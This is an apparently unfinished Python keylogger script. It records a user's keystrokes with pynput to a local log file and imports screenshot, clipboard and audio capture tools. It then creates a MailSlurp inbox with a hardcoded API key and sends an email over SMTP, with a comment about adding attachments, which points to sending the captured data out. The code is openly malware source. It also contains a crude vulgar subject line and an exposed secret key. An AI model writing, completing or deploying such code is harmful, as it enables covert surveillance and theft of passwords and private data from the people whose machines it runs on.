from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from os import access
import mailslurp_client
from requests import options
from smtplib import SMTP

import socket
import platform

#import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from cryptography.fernet import Fernet

from scipy.io.wavfile import write
import sounddevice as sd

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
#file_path to be changed to C:\Users\Geek\AppData\Roaming
file_path = os.getcwd()
extend="\\"

count = 0
keys=[]

def on_press(key):
    global keys,count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys =[]

def write_file(keys):
    with open(file_path+extend+keys_information,"a") as f:
        print("file opened in roaming succesffully")
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key==Key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()


# create a mailslurp configuration
configuration = mailslurp_client.Configuration()
configuration.api_key['x-api-key'] = "40a688f9057922a582256f5b0ac396ebf21f194681ac2b9a0c6dbc521be79dbe" #change api
with mailslurp_client.ApiClient(configuration) as api_client:
    # create an inbox
    inbox_controller = mailslurp_client.InboxControllerApi(api_client)
    options = mailslurp_client.CreateInboxDto()
    options.name = "data"
    options.inbox_type="SMTP_INBOX"
    inbox = inbox_controller.create_inbox_with_options(options)
    print("email address is " + inbox.email_address)
    
access_details=inbox_controller.get_imap_smtp_access(inbox_id=inbox.id)
print(access_details)
print("sending")
with SMTP(
    host=access_details.smtp_server_host,
    port= access_details.smtp_server_port,
) as smtp:
    msg="Subject: I LOVE COCK AND BALLS\r\n\r\nThis is my body" #have to add attachments 
    smtp.login(user=access_details.smtp_username,password=access_details.smtp_password)
    smtp.sendmail(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
    smtp.quit()
print("check your mail :)")